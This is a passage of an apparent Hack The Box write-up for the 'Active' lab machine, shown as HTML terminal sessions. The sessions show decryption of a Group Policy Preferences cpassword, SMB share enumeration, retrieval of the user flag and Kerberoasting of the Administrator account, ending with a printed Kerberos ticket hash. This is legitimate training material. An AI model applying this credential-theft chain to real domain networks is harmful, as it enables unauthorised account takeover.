+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\P</span>references<span style="color:#ae81ff">\G</span>roups<span style="color:#ae81ff">\G</span>roups.xml of size <span style="color:#ae81ff">533</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups/Groups.xml <span style="color:#f92672">(</span>1.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.5 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows NT<span style="color:#ae81ff">\S</span>ecEdit<span style="color:#ae81ff">\G</span>ptTmpl.inf of size <span style="color:#ae81ff">1098</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf <span style="color:#f92672">(</span>2.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows NT<span style="color:#ae81ff">\S</span>ecEdit<span style="color:#ae81ff">\G</span>ptTmpl.inf of size <span style="color:#ae81ff">3722</span> as active.htb/Policies/<span style="color:#f92672">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span>/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf <span style="color:#f92672">(</span>8.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 2.5 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ^C
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active/Smb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>active.htb
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active/Smb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd active.htb 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/Kali/Active/Smb/active.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>DfsrPrivate  Policies  scripts
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/Kali/Active/Smb/active.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tree                
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── DfsrPrivate
+</span></span><span style="display:flex;"><span>│   ├── ConflictAndDeleted
+</span></span><span style="display:flex;"><span>│   ├── Deleted
+</span></span><span style="display:flex;"><span>│   └── Installing
+</span></span><span style="display:flex;"><span>├── Policies
+</span></span><span style="display:flex;"><span>│   ├── <span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>│   │   ├── GPT.INI
+</span></span><span style="display:flex;"><span>│   │   ├── Group Policy
+</span></span><span style="display:flex;"><span>│   │   │   └── GPE.INI
+</span></span><span style="display:flex;"><span>│   │   ├── MACHINE
+</span></span><span style="display:flex;"><span>│   │   │   ├── Microsoft
+</span></span><span style="display:flex;"><span>│   │   │   │   └── Windows NT
+</span></span><span style="display:flex;"><span>│   │   │   │       └── SecEdit
+</span></span><span style="display:flex;"><span>│   │   │   │           └── GptTmpl.inf
+</span></span><span style="display:flex;"><span>│   │   │   ├── Preferences
+</span></span><span style="display:flex;"><span>│   │   │   │   └── Groups
+</span></span><span style="display:flex;"><span>│   │   │   │       └── Groups.xml
+</span></span><span style="display:flex;"><span>│   │   │   └── Registry.pol
+</span></span><span style="display:flex;"><span>│   │   └── USER
+</span></span><span style="display:flex;"><span>│   └── <span style="color:#f92672">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>│       ├── GPT.INI
+</span></span><span style="display:flex;"><span>│       ├── MACHINE
+</span></span><span style="display:flex;"><span>│       │   └── Microsoft
+</span></span><span style="display:flex;"><span>│       │       └── Windows NT
+</span></span><span style="display:flex;"><span>│       │           └── SecEdit
+</span></span><span style="display:flex;"><span>│       │               └── GptTmpl.inf
+</span></span><span style="display:flex;"><span>│       └── USER
+</span></span><span style="display:flex;"><span>└── scripts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span> directories, <span style="color:#ae81ff">7</span> files
+</span></span></code></pre></div><p>Browsing the files reveals valuable information within <code>Groups.xml</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active/Smb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd active.htb/Policies/<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#ae81ff">\}</span>/MACHINE/Preferences/Groups/ 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls                    
+</span></span><span style="display:flex;"><span>Groups.xml
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                    
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat Groups.xml                                                                             
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;Groups clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span> image<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> changed<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span> uid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;U&#34;</span> newName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> fullName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> cpassword<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> changeLogon<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> noChange<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> neverExpires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> acctDisabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> userName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
+</span></span><span style="display:flex;"><span>&lt;/Groups&gt;
+</span></span></code></pre></div><p>Found a user credential：
+<code>active.htb\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>
+<p>Searching to see what kind of encryption method this is。</p>
+<p><img src="Pasted%20image%2020260414185018.png" alt=""></p>
+<p>This is GPP encrypthion.Using <code>gpp-decrypt</code> to decrypt it, get the password for <code>SVC_TGS</code>, which is <code>GPPstillStandingStrong2k18</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gpp-decrypt <span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span>
+</span></span><span style="display:flex;"><span>GPPstillStandingStrong2k18
+</span></span></code></pre></div><h2 id="obtaining-the-user-flag">Obtaining the User flag</h2>
+<p>Using account <code>SVC_TGS</code> to enumerate SMB, discovered the directory <code>Users</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbmap -H 10.129.18.244 -u SVC_TGS -d active.htb -p <span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> 
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______                                                                                                                       
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\                                                                                                                      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)                                                                                                                     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/                                                                                                                      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /                                                                                                                          
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\ </span>                                                                                                                        
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>-----------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com             
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                       
+</span></span><span style="display:flex;"><span>                                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.129.18.244:445       Name: active.htb                Status: Authenticated   
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions     Comment
+</span></span><span style="display:flex;"><span>        ----                                                    -----------     -------   
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS       Remote Admin
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS       Default share
+</span></span><span style="display:flex;"><span>        IPC$                                                    NO ACCESS       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON                                                READ ONLY       Logon server share 
+</span></span><span style="display:flex;"><span>        Replication                                             READ ONLY                                                                                                           
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  READ ONLY       Logon server share                                                                    
+</span></span><span style="display:flex;"><span>        Users                                                   READ ONLY       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Found <code>user.txt</code> inside <code>Users</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //active.htb/Users -U <span style="color:#e6db74">&#39;active.htb\SVC_TGS%GPPstillStandingStrong2k18&#39;</span>                 
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                  DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                 DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Administrator                       D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">16</span> 06:14:21 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  All Users                       DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 02:38:21 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Default User                    DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Public                             DR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  SVC_TGS                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5202540</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                  DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                 DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Administrator                       D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">16</span> 06:14:21 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  All Users                       DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 02:38:21 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Default User                    DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Public                             DR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  SVC_TGS                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>cd
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5202540</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd SVC_TGS
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Contacts                            D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:11 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Desktop                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:42 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Downloads                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:23 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Favorites                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:44 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Links                               D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:57 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Documents                        D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:03 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Music                            D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:32 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Pictures                         D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:43 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  My Videos                           D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:15:53 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Saved Games                         D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:12 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  Searches                            D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:24 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>cd Des
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5202540</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\&gt;</span> cd Desktop
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:42 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:14:42 <span style="color:#ae81ff">2018</span>
+</span></span><span style="display:flex;"><span>  user.txt                           AR       <span style="color:#ae81ff">34</span>  Mon Apr <span style="color:#ae81ff">13</span> 20:35:17 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5202540</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\&gt;</span> mget user.txt
+</span></span><span style="display:flex;"><span>Get file user.txt? y
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\S</span>VC_TGS<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt of size <span style="color:#ae81ff">34</span> as user.txt <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat user.txt  
+</span></span><span style="display:flex;"><span>4def5a4b**********609a8c31b0
+</span></span></code></pre></div><h2 id="obstaining--administrator-access">Obstaining  Administrator Access</h2>
+<p>Using <code>GetUserSPNs</code> to enumerate domain users with registered SPNS,found <code>Administrator</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-GetUserSPNs active.htb/SVC_TGS:<span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.129.18.244 -request  
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+</span></span><span style="display:flex;"><span>--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span style="display:flex;"><span>active/CIFS:445       Administrator  CN<span style="color:#f92672">=</span>Group Policy Creator Owners,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb  2018-07-18 15:06:40.351723  2026-04-13 20:35:21.997740             
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> CCache file is not found. Skipping...
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4
+</span></span><span style="display:flex;"><span> 
+</span></span></code></pre></div><p>Save is as <code>admin.hash</code>.</p>
